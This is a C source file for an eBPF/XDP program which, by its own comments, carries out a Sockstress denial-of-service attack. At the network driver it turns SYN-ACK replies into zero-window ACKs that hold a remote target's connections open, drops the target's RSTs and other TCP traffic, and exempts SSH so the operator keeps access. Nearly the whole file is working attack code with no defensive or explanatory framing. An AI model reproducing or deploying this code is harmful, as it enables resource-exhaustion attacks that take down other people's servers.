#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/in.h>

#define SEC(NAME) __attribute__((section(NAME), used))

#ifndef htons
#define htons(x) ((__u16)( \
        (((__u16)(x) & (__u16)0x00ffU) << 8) | \
        (((__u16)(x) & (__u16)0xff00U) >> 8) ))
#endif

#ifndef ntohs
#define ntohs(x) htons(x)
#endif

#ifndef htonl
#define htonl(x) ((__u32)( \
        (((__u32)(x) & (__u32)0x000000ffUL) << 24) | \
        (((__u32)(x) & (__u32)0x0000ff00UL) << 8) | \
        (((__u32)(x) & (__u32)0x00ff0000UL) >> 8) | \
        (((__u32)(x) & (__u32)0xff000000UL) >> 24) ))
#endif

#ifndef ntohl
#define ntohl(x) htonl(x)
#endif

static inline unsigned short ip_checksum(struct iphdr *ip) {
    unsigned int sum = 0;
    unsigned short *ptr = (unsigned short *)ip;
    
    #pragma clang loop unroll(full)
    for (int i = 0; i < 10; i++) {
        sum += ptr[i];
    }
    
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return ~sum;
}

static inline unsigned short tcp_checksum_bpf(struct iphdr *iph, struct tcphdr *tcph, void *data_end) {
    unsigned int sum = 0;
    
    sum += (iph->saddr & 0xffff);
    sum += (iph->saddr >> 16);
    sum += (iph->daddr & 0xffff);
    sum += (iph->daddr >> 16);
    sum += htons(IPPROTO_TCP);
    
    int tcp_len = ntohs(iph->tot_len) - (iph->ihl * 4);
    sum += htons(tcp_len);
    
    unsigned short *ptr = (unsigned short *)tcph;
    
    #pragma clang loop unroll(full)
    for (int i = 0; i < 30; i++) {
        if ((void *)(ptr + i + 1) > data_end) {
            break;
        }
        if (i * 2 >= tcp_len) {
            break;
        }
        sum += ptr[i];
    }
    
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return ~sum;
}

SEC("xdp")
int xdp_v15_hybrid(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    struct ethhdr *eth = data;
    if ((void *)eth + sizeof(*eth) > data_end)
        return XDP_PASS;

    if (eth->h_proto != htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *iph = (void *)eth + sizeof(*eth);
    if ((void *)iph + sizeof(*iph) > data_end)
        return XDP_PASS;

    // Allow all non-TCP/UDP protocols through
    if (iph->protocol == IPPROTO_UDP)
        return XDP_PASS;

    if (iph->protocol != IPPROTO_TCP)
        return XDP_PASS;

    int ip_hdr_len = iph->ihl * 4;
    if (ip_hdr_len < sizeof(*iph))
        return XDP_PASS;

    if ((void *)iph + ip_hdr_len > data_end)
        return XDP_PASS;

    struct tcphdr *tcph = (void *)iph + ip_hdr_len;
    if ((void *)tcph + sizeof(*tcph) > data_end)
        return XDP_PASS;

    int tcp_len = ntohs(iph->tot_len) - ip_hdr_len;
    if (tcp_len < sizeof(*tcph))
        return XDP_PASS;

    __u16 dport = ntohs(tcph->dest);
    __u16 sport = ntohs(tcph->source);

    // Allow SSH traffic in BOTH directions (management access)
    // dport==22: incoming SSH to us, sport==22: SSH response from remote
    if (dport == 22 || sport == 22)
        return XDP_PASS;

    // Reflect SYN-ACK packets back as ACK with zero window (Sockstress)
    // This happens at NIC driver level - maximum speed, zero kernel overhead
    if (tcph->syn && tcph->ack) {
        // Swap MAC addresses
        unsigned char tmp_mac[6];
        __builtin_memcpy(tmp_mac, eth->h_source, 6);
        __builtin_memcpy(eth->h_source, eth->h_dest, 6);
        __builtin_memcpy(eth->h_dest, tmp_mac, 6);

        // Swap IP addresses
        __u32 tmp_ip = iph->saddr;
        iph->saddr = iph->daddr;
        iph->daddr = tmp_ip;

        // Swap Ports
        __u16 tmp_port = tcph->source;
        tcph->source = tcph->dest;
        tcph->dest = tmp_port;

        // Calculate sequence/acknowledgement numbers
        __u32 new_seq = tcph->ack_seq;
        __u32 new_ack = htonl(ntohl(tcph->seq) + 1);
        tcph->seq = new_seq;
        tcph->ack_seq = new_ack;

        // Modify TCP flags: ACK only
        tcph->syn = 0;
        tcph->ack = 1;
        tcph->psh = 0;
        tcph->fin = 0;
        tcph->rst = 0;

        // Set TCP Window size to 0 (Sockstress - resource exhaustion)
        tcph->window = 0;

        // Recalculate IP TTL for reflected packet
        iph->ttl = 64;

        // Recalculate checksums
        iph->check = 0;
        iph->check = ip_checksum(iph);

        tcph->check = 0;
        tcph->check = tcp_checksum_bpf(iph, tcph, data_end);

        return XDP_TX;
    }

    // DROP all other incoming TCP from target (RST, FIN, ACK, etc)
    // Prevents kernel from processing and wasting CPU/bandwidth on RSTs
    return XDP_DROP;
}

char _license[] SEC("license") = "GPL";
